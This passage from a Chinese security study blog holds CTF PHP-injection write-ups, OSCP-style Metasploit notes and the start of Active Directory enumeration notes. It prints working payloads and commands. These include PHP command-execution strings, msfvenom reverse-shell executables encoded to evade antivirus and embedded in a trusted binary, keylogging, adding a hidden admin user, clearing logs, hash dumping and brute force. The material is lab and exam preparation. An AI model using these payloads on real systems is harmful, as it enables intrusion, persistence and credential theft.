<code>PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/PiA=</code></li></ul><h3 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;        <br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);    <br>  &#125;        <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>强制添加后缀 可以直接<code>c=data://text/plain,&lt;?php system(&quot;cat *&quot;);?&gt;</code></li></ul><h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>1：没有过滤英文括号<ul><li>可以使用之前Web31的无参数payload<code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></li></ul></li><li>2：hint 利用session<ul><li><code>?c=session_start();system(session_id());</code></li><li>然后修改PHPSESSID值</li></ul></li><li>3：设置变量，执行变量<ul><li><code>?c=eval(array_pop(next(get_defined_vars())));</code></li><li>post传入：<code>1=phpinfo</code></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2022/09/02/Metasploit/"/>
    <url>/2022/09/02/Metasploit/</url>
    
    <content type="html"><![CDATA[<h2 id="用户界面"><a href="#用户界面" class="headerlink" title="用户界面"></a>用户界面</h2><h3 id="用户界面-1"><a href="#用户界面-1" class="headerlink" title="用户界面"></a>用户界面</h3><ul><li>启动数据库服务<ul><li><code>kali@kali:~$ sudo systemctl start postgresql</code></li><li><code>kali@kali:~$ sudo systemctl enable postgresql</code></li></ul></li><li>初始化数据库(一次性操作)<ul><li><code>kali@kali:~$ sudo msfdb init</code></li></ul></li><li>升级msf<ul><li><code>kali@kali:~$ sudo apt update; sudo apt install metasploit-framework</code></li></ul></li><li>启动数据库服务<ul><li><code>kali@kali:~$ sudo msfconsole -q</code></li></ul></li></ul><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul><li>所有模块<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902220306.png"></li><li>使用，退出，回到上一个模块<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902220522.png"></li><li>执行nmap扫描<ul><li><code>msf5 &gt; db_nmap</code></li></ul></li><li>列出已经发现的主机<ul><li><code>msf5 &gt; hosts</code></li></ul></li><li>列出开放了445端口的主机<ul><li><code>msf5 &gt; services -p 445</code></li></ul></li><li>不同的渗透项目可以分隔存储于不同的workspace中<ul><li><code>msf5 &gt; workspace</code></li><li>-a 添加工作区</li><li>-d 删除工作区</li></ul></li></ul><h2 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a>Exploit模块</h2><h3 id="漏洞利用模块"><a href="#漏洞利用模块" class="headerlink" title="漏洞利用模块"></a>漏洞利用模块</h3><ul><li>利用漏洞的攻击代码，包含1700个exp</li><li>搜索syncbreeze已知漏洞<ul><li><code>msf5 &gt; search syncbreeze</code></li></ul></li><li>查看漏洞利用模块信息<ul><li><code>msf5 &gt; info exploit/windows/http/syncbreeze_bof</code></li></ul></li><li>查看当前EXP支持的payload<ul><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; show payloads</code></li><li><code>msf5 exploit(windows/http/syncbreeze_bof) &gt; set payload windows/shell_reverse_tcp</code></li><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; show target</code></li><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; set target ......</code></li></ul></li><li>设置反弹shell连接地址<ul><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; set LHOST 192.168.119.2</code></li><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; set RHOST 192.168.10.11</code></li></ul></li><li>检查目标主机是否存在漏洞<ul><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; check</code></li></ul></li><li>执行漏洞利用代码<ul><li><code>msf5 exploit(/windows/http/syncbreeze_bof) &gt; exploit</code></li></ul></li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><ul><li>出了基本Payload，msf还包含多种高级payload</li><li>Non-Staged: 部分阶段Payload与EXP一起完整地发送到目标系统</li><li>Staged: 分阶段Payload通常分为两部分<ul><li>第一部分较小，负责反弹shell传输较大的第二部分Payload并执行</li><li>当没有足够缓存空间来存储payload</li><li>避免被AV软件发现，第一阶段不包含明显特征的恶意代码，利用其加载第二阶段代码到内存中执行</li></ul></li><li>名称中的”&#x2F;“用来指示Payload是否分阶段<ul><li>不分阶段: shell_reverse_tcp</li><li>分阶段: shell&#x2F;reverse_tcp<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902224617.png"></li></ul></li></ul><h3 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h3><ul><li><p>运行时可动态拓展的多功能Payload</p><ul><li>提供更多的功能和函数（传文件、键盘记录、音视频开启等）</li></ul></li><li><p>支持多系统、多架构、多语言、多协议</p><ul><li><code>msf5 &gt; search meterpreter type:payload</code></li><li><code>msf5 exploit(windows/http/syncbreeze_bof) &gt; set payload windows/meterpreter/reverse_http</code></li></ul></li><li><p><code>meterpreter &gt; sysinfo</code></p></li><li><p><code>meterpreter &gt; getuid</code></p></li><li><p><code>meterpreter &gt; help</code></p></li><li><p>上传和下载<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902224917.png"></p></li><li><p>Meterpreter内建支持的其他常用命令</p><ul><li><code>execute</code>   -&gt; 执行其他程序</li><li><code>ps</code>        -&gt; 查看进程</li><li><code>kill</code>      -&gt; 结束进程</li></ul></li><li><p>其他payload类型</p><ul><li><code>vncinject/reverse_http</code>    -&gt; 反弹VNC图形shell</li><li><code>php/reverse_http</code>  -&gt; php反弹shell，用于WEB攻击</li></ul></li><li><p>可执行的payload</p><ul><li>可以以不同的文件格式导出</li></ul></li><li><p>生成PE反弹格式Shell</p><ul><li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe</code></li></ul></li><li><p>编码ShellCode</p><ul><li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe</code></li></ul></li><li><p>将Payload注入可信PE文件 -x</p><ul><li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_re verse_msf_encoded_embedded.exe</code></li></ul></li><li><p>控制台界面生成paylaod<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902225732.png"></p></li><li><p>启用Multi Handler侦听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 &gt; use multi/handler<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 10.11.0.4<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 443<br>msf5 exploit(multi/handler) &gt; exploit<br>msf5 exploit(multi/handler) &gt; exploit -j <span class="hljs-comment"># 置于后台</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><ul><li>建立Meterpreter Shell 之后，立即自动执行客户端枚举脚本<ul><li><code>msf5 exploit(multi/handler) &gt; set AutoRunScript windows/gather/enum_logged_on_users</code></li><li><code>msf5 exploit(multi/handler) &gt; exploit -j</code></li></ul></li><li>返回执行其他操作<ul><li><code>meterpreter &gt; background</code></li><li><code>msf5 exploit(multi/handler) &gt; sessions -l</code></li><li><code>msf5 exploit(multi/handler) &gt; sessions -i 5</code></li></ul></li><li>建立出事Meterpreter会话之后，使用transports可切换不同协议(TCP &#x3D;&gt; HTTPS)</li><li>查看当前Meterpreter会话可用的transports<ul><li><code>meterpreter &gt; transport list</code></li></ul></li><li>向当前Meterpreter会话中添加新的传输协议，并执行传输类型(-t)<ul><li><code>meterpreter &gt; transport add -t reverse_tcp -l 10.11.0.4 -p 5555</code></li></ul></li><li>使用新的transport之前，需要先开启multi&#x2F;Handler侦听</li><li>切换到新的transport(原来的会中断)<ul><li><code>meterpreter &gt; transport next</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220902231125.png"></li></ul></li></ul><h2 id="自定义模块"><a href="#自定义模块" class="headerlink" title="自定义模块"></a>自定义模块</h2><h3 id="自定义模块-1"><a href="#自定义模块-1" class="headerlink" title="自定义模块"></a>自定义模块</h3><ul><li>将SyncBreeze的Python EXP代码转换为Metasploit格式<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ sudo <span class="hljs-built_in">mkdir</span> -p /root/.msf4/modules/exploits/windows/http<br>kali@kali:~$ sudo <span class="hljs-built_in">cp</span> /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb<br>kali@kali:~/.msf4/modules/exploits/windows/http$ sudo nano /root/.msf4/modules/exploit s/windows/http/syncbreeze.rb<br></code></pre></td></tr></table></figure></li></ul><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><h3 id="核心-Post-Exploitation功能"><a href="#核心-Post-Exploitation功能" class="headerlink" title="核心 Post-Exploitation功能"></a>核心 Post-Exploitation功能</h3><ul><li>获取屏幕截图<ul><li><code>meterpreter &gt; screenshot</code></li></ul></li><li>启动键盘记录器（首先要切换到要进行键盘记录的用户上下文 -&gt; migrate）<ul><li><code>meterpreter &gt; keyscan_start</code></li><li><code>meterpreter &gt; keyscan_stop</code></li></ul></li><li>迁移进程<ul><li><code>meterpreter &gt; ps</code></li><li><code>meterpreter &gt; migrate pid</code></li></ul><p></p></li><li>MSF作为跳板穿透内网<ul><li>以被控主机为跳板，内网跨越，被控主机连着两个网卡，添加内网路由</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 &gt; route add 192.168.1.0/24 11<br>msf5 &gt; use auxiliary/scanner/portscan/tcp<br>msf5 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.110<br>msf5 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> PORTS 445,3389<br>msf5 auxiliary(scanner/portscan/tcp) &gt; run<br><span class="hljs-comment"># 如果要使用除MSF以外的工具 例如NMAP</span><br>msf6 &gt; use auxiliary/server/socks_proxy<br>msf6 &gt; run<br><span class="hljs-comment"># 这样的话相当于是一个代理的侦听端口</span><br></code></pre></td></tr></table></figure><h2 id="MSF实战"><a href="#MSF实战" class="headerlink" title="MSF实战"></a>MSF实战</h2><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1. 基础命令"></a>1. 基础命令</h3><ul><li>主机发现</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027104825008.png" alt="image-20221027104825008"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027104846235.png" alt="image-20221027104846235"></p><ul><li>端口扫描</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027104141420.png" alt="image-20221027104141420"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027104741137.png" alt="image-20221027104741137"></p><ul><li>漏洞利用</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027121701869.png" alt="image-20221027121701869"></p><ul><li>meterpreter shell 和 普通shell的区别</li></ul><ol><li>meterpreter shell 集成了许多插件 例如提权、文件上传下载</li><li>meterpreter shell 流量加密 加载在内存中，普通shell传输数据是一个明文</li></ol><h3 id="2-msf数据库"><a href="#2-msf数据库" class="headerlink" title="2. msf数据库"></a>2. msf数据库</h3><ul><li>数据库命令</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027122843040.png" alt="image-20221027122843040"></p><ul><li>重置数据库</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027122928367.png" alt="image-20221027122928367"></p><ul><li>数据库信息 <code>/usr/share/metasploit-framework/config/database.yml</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027123032252.png" alt="image-20221027123032252"></p><ul><li>连接数据库<ul><li><code>msf6 &gt; db_connect msf:cOkO4Rx74ojmWuLddxoaCY2RwqyLQFytJDln9wpuBUY=@localhost:5432/msf</code></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027123305006.png" alt="image-20221027123305006"></p><ul><li>db_namp 扫描<ul><li><code>msf6 &gt; db_nmap -A 192.168.80.149</code></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027124127576.png"></p><ul><li>查看扫描结果(已保存在数据库中)</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027124002680.png" alt="image-20221027124002680"></p><h3 id="3-msfvenom"><a href="#3-msfvenom" class="headerlink" title="3. msfvenom"></a>3. msfvenom</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027124408070.png" alt="image-20221027124408070"></p><ul><li>-l list</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027124502555.png" alt="image-20221027124502555"></p><ul><li>-p 指定payload -f 指定输出格式 -o 指定输出名字</li><li>生成php木马 <code>msfvenom -p php/meterpreter/reverse_tcp -f raw -o bad.php</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027125216568.png" alt="image-20221027125216568"></p><ul><li>生成windows木马 <code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.129 lport=1122 -f exe &gt; shell.exe</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027125429881.png" alt="image-20221027125429881"></p><p><strong>lhost 和 lport 没有-!</strong></p><ul><li>shellcode编码 做免杀用 有一定效果</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027131536442.png" alt="image-20221027131536442"></p><ul><li><p>-e 指定编码</p></li><li><p>-i 编码次数</p></li><li><p>-b 过滤badchar</p></li><li><p>-s 指定大小</p></li><li><p><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b &#39;\x00\xff&#39; lhost=192.168.80.129 lport=9999 -f exe &gt; bad.exe</code></p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027131941617.png" alt="image-20221027131941617"></p><h3 id="4-监听模块"><a href="#4-监听模块" class="headerlink" title="4. 监听模块"></a>4. 监听模块</h3><ul><li><p>监听模块: <code>msf6 &gt; use exploit/multi/handler</code></p></li><li><p>设置监听</p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027131419461.png" alt="image-20221027131419461"></p><ul><li>监听参数 数据流量加密 session过期时间等</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027132056354.png" alt="image-20221027132056354"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027132124923.png" alt="image-20221027132124923"></p><h3 id="5-post-后渗透测试模块"><a href="#5-post-后渗透测试模块" class="headerlink" title="5. post 后渗透测试模块"></a>5. post 后渗透测试模块</h3><ul><li><p><code>/usr/share/metasploit-framework/modules/post</code></p></li><li><p>session传递 <code>use exploit/windows/local/payload_inject</code></p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027132707422.png" alt="image-20221027132707422"></p><ul><li>队友监听7892</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027133312705.png" alt="image-20221027133312705"></p><ul><li>本地通过payload_inject传递</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027133545583.png" alt="image-20221027133545583"></p><ul><li>成功传递</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027133613015.png" alt="image-20221027133613015"></p><ul><li><p>进程注入 <code>meterpreter &gt; run  post/windows/manage/multi_meterpreter_inject</code></p></li><li><p>拿到shell后这样注入是可以规避av的</p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027134216997.png" alt="image-20221027134216997"></p><ul><li>开启远程桌面 <code>meterpreter &gt; run post/windows/manage/enable_rdp</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027135249822.png" alt="image-20221027135249822"></p><ul><li>新建用户 并且添加到管理员组</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net user <span class="hljs-comment"># 查看用户</span><br>net user bad Dab123..<span class="hljs-number">123456</span> /add <span class="hljs-comment"># 添加用户 注意密码复杂度</span><br>net localgroup administrators bad /add <span class="hljs-comment"># 添加进管理员组 默认只有管理员组才具有远程桌面权限</span><br></code></pre></td></tr></table></figure><ul><li>kali 远程连接bad用户</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027135540302.png" alt="image-20221027135540302"></p><ul><li>清理windows日志(痕迹清理</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027135659116.png" alt="image-20221027135659116"></p><ul><li>windows本地提权<code>meterpreter &gt; run post/multi/recon/local_exploit_suggester</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027140447911.png" alt="image-20221027140447911"></p><h3 id="6-内网渗透"><a href="#6-内网渗透" class="headerlink" title="6. 内网渗透"></a>6. 内网渗透</h3><ul><li>路由信息以及arp信息收集</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027141106717.png" alt="image-20221027141106717"></p><ul><li>添加路由信息</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027141238797.png" alt="image-20221027141238797"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027141257473.png" alt="image-20221027141257473"></p><ul><li>使用路由模式代理Nmap效果非常差</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027144320256.png" alt="image-20221027144320256"></p><ul><li>开启socks5代理 将流量全转发</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027144553632.png" alt="image-20221027144553632"></p><ul><li>使用本地代理工具 配置proxychains</li></ul><h3 id="7-meterpreter"><a href="#7-meterpreter" class="headerlink" title="7. meterpreter"></a>7. meterpreter</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># hashdump 导出hash</span><br><span class="hljs-comment"># steal_token 偷取用户身份</span><br><span class="hljs-comment"># excute -f notepad.exe</span><br><span class="hljs-comment"># localtime 本地时间</span><br><span class="hljs-comment"># idletime 空闲时间</span><br><span class="hljs-comment"># migrate 进程迁移</span><br><span class="hljs-comment"># search -f flag.txt 文件搜索</span><br><span class="hljs-comment"># download flag.txt 文件下载</span><br><span class="hljs-comment"># rev2self 还原会话</span><br><span class="hljs-comment"># 端口转发 portfwd add -l 1111 -r 192.168.80.149 -p 3389</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027155751528.png" alt="image-20221027155751528"></p><h3 id="8-其他使用"><a href="#8-其他使用" class="headerlink" title="8. 其他使用"></a>8. 其他使用</h3><ul><li>mysql 爆破</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027153608973.png" alt="image-20221027153608973"></p><ul><li>sql 盲注</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027155434781.png" alt="image-20221027155434781"></p><ul><li>ssh 爆破</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027155458898.png" alt="image-20221027155458898"></p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决VMware获取不到靶机IP的问题</title>
    <link href="/2022/08/21/%E8%A7%A3%E5%86%B3VMware%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0%E9%9D%B6%E6%9C%BAIP%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/21/%E8%A7%A3%E5%86%B3VMware%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0%E9%9D%B6%E6%9C%BAIP%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="VMware下靶机IP修改"><a href="#VMware下靶机IP修改" class="headerlink" title="VMware下靶机IP修改"></a>VMware下靶机IP修改</h3><ul><li>修改网络模式为NAT</li><li>进入grub<ul><li>系统开机之前，长按shift，即可进入grub</li></ul></li><li>选中最后有（recovery mode）的选项，推荐选择版本较高的一个。<ul><li>光标选中后按e进入如下界面<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821094649.png"></li></ul></li><li>找到recovery nomodeset并将其删掉，再在这一行的最后面（dis_ucode_ldr后面）输入quiet splash rw init&#x3D;&#x2F;bin&#x2F;bash</li><li>按F10或者ctrl+x</li><li>Ubuntu<ul><li>vim &#x2F;etc&#x2F;network&#x2F;interfaces</li><li>Netplan<ul><li>vim &#x2F;etc&#x2F;netplan&#x2F;*.yaml</li></ul></li></ul></li><li>CentOS<ul><li>vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;iface-eth0</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击活动目录</title>
    <link href="/2022/08/18/%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <url>/2022/08/18/%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><ul><li>Active Directory域在大型企业中实现集中的系统、账号、应用、数据访问管理</li><li>LDAP协议<ul><li>设计用来访问目录数据库的一个协议</li></ul></li><li>域是一个安全边界, 加入域的计算机之间彼此存在信任关系</li><li>由于AD可以是一个非常复杂和细粒度的管理层, 它的攻击面很大</li><li>AD攻击方法主要包括枚举、身份认证、横向纵向移动</li><li>AD安装<ul><li>前提条件: 静态IP地址(hostname dc01)</li><li>服务器管理 &#x3D;&gt; 添加角色和功能</li><li>勾选”Active Directory域服务”</li><li>安装完成后, 右上角单击叹号图标, 单击”将此服务器提升为域控制器”</li><li>DC安装完成后, 将计算和成员服务器加入活动目录域</li></ul></li></ul><h3 id="AD理论"><a href="#AD理论" class="headerlink" title="AD理论"></a>AD理论</h3><ul><li>Active Directory 由几个组件组成。最重要的组件是域控制器 (DC)</li><li>DC存储域中所有配置信息，以及域内对象彼此之间的访问控制规则</li><li>域中可包含多种类型的对象(计算机、用户、组账号、资源、服务等)</li><li>管理员可以通过OU分组存储域内的对象</li><li>AD中每种对象有各自不同的属性Attributes<ul><li>用户属性：first name、last name、Password</li></ul></li><li>常见的成员服务器包括数据库、文件、邮件地址、web等（集成域）</li><li>对外网提供服务的主机也可以加入，但是通常不推荐加入</li><li>AD依赖DNS名称解析，DC几乎总是DNS服务器</li></ul><h2 id="AD枚举"><a href="#AD枚举" class="headerlink" title="AD枚举"></a>AD枚举</h2><h3 id="AD枚举-1"><a href="#AD枚举-1" class="headerlink" title="AD枚举"></a>AD枚举</h3><ul><li>AD渗透针对权限结构进行攻击，并非主机系统漏洞</li><li>AD渗透起始于枚举<ul><li>基于已控制的一台域内成员计算机</li></ul></li><li>域通常使用组账号简化权限管理，枚举高权限组成员（Domain Admins）</li><li>目标是获得高权限账号，完全控制DC<ul><li>DC包含域所有账号密码HASH</li></ul></li></ul><h3 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h3><ul><li>枚举本地账号<ul><li><code>C:\Users\Offsec.corp&gt; net user</code></li></ul></li><li>枚举远程账号<ul><li><code>C:\Users\Offsec.corp&gt; net user /domain</code></li></ul></li><li>根据名称，查询疑似管理员的账号或现域管理员<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820223959.png"></li><li>枚举域内所有组，关注域管理员组（域用户没法枚举全部组）</li><li>net.exe命令无法查询组层级嵌套关系<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820224020.png"></li><li>组装 LDAP 提供程序路径<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span 